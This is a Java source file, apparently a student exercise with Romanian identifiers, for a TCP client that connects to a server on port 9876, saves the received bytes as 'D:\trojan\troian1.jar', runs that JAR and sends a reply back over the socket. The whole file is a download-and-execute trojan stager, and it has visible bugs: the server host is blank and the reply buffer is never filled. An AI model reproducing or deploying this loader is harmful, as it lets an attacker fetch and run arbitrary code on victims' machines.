package TCP;

import java.io.BufferedOutputStream;
import java.io.BufferedReader;
import java.io.DataOutputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.Socket;

public class TCPClient {

  public final static int port = 9876;     //port
  public final static String server = "" ;//localhost
  public final static String fisierul_primit = "D:\\trojan\\troian1.jar";  //destination of received forder 

  public final static int marimeTotalaFisier = 1000000; 

  public static void main (String [] args ) throws IOException, InterruptedException {
	  
    int nrBitiCititi;
    
    int current = 0;
    
    FileOutputStream fisierulScris = null;
    
    BufferedOutputStream bufferPtFisier = null;
    
    Socket socket = null;
    
    try {
    	
      socket = new Socket(server, port);
      
      System.out.println("Conectat...");

      // receive file
      byte [] vectorBiti = new byte [marimeTotalaFisier];
      
      InputStream input = socket.getInputStream();
     
      
      fisierulScris = new FileOutputStream(fisierul_primit);
      
      bufferPtFisier = new BufferedOutputStream(fisierulScris);
      
      nrBitiCititi = input.read(vectorBiti,0,vectorBiti.length);
      
      current = nrBitiCititi;

      do {
    	  
    	  nrBitiCititi = input.read(vectorBiti, current, (vectorBiti.length-current));
         
         if(nrBitiCititi >= 0)
        	 current += nrBitiCititi;
         
      } while(nrBitiCititi > -1);

      bufferPtFisier.write(vectorBiti, 0 , current);
      
      bufferPtFisier.flush();
      
      System.out.println("Creating Process...");
      System.out.println("Fisierul primit de la server: " + fisierul_primit + " desarcat (" + current + " bytes cititi)");
      
      
      OutputStream output = null;
      	ProcessBuilder pb = new ProcessBuilder("java", "-jar",fisierul_primit );
		 Process p = pb.start();
		 BufferedReader in = new BufferedReader(new InputStreamReader(p.getInputStream()));
		 
		 String s = "";
		 String message = "";
		 
		 while((s = in.readLine()) != null){
		     System.out.println("Rezultat: "+ s );
		     message = s;
		 }
		 int status = p.waitFor();
		 System.out.println("Exited with status: " + status);
		 
		 byte [] vectorBitiTrimisi = new byte [(int)message.length()];
		 
		 output = socket.getOutputStream();
		 
		 System.out.println("Trimite catre server " + message + "(" + vectorBitiTrimisi.length + " bytes)");
         
         output.write(vectorBitiTrimisi,0,vectorBitiTrimisi.length);
         
         output.flush();
         
         System.out.println("Trimis catre server !");
      
     }
    finally {
    	
    
      if (fisierulScris != null){ 
        fisierulScris.close();
          
      }
        
      if (bufferPtFisier != null) 
    	  bufferPtFisier.close();
      }
  }

}